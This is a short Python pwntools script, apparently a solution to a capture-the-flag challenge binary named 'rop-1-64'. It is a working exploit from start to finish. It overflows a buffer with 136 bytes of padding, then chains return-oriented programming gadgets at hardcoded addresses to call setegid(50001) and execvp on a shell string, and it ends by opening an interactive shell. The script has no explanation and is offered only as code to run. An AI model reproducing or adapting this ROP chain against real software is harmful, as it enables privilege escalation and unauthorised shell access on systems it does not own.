from pwn import *

p = process("./rop-1-64")
poprdi = p64(0x00000000004007e3)
poprsi = p64(0x00000000004007e1)
poprdx = p64(0x00000000004006d8)
setegid = p64(0x400580)
sh = p64(0x6008b4)
execvp = p64(0x400560)
payload = "A"*136 +  poprdi + p64(50001) +poprsi + p64(50001) + "\x00"*8 + setegid + poprdi + sh + poprsi + "\x00"*16 + poprdx + "\x00"*16 + execvp

p.sendline(payload)
p.interactive()
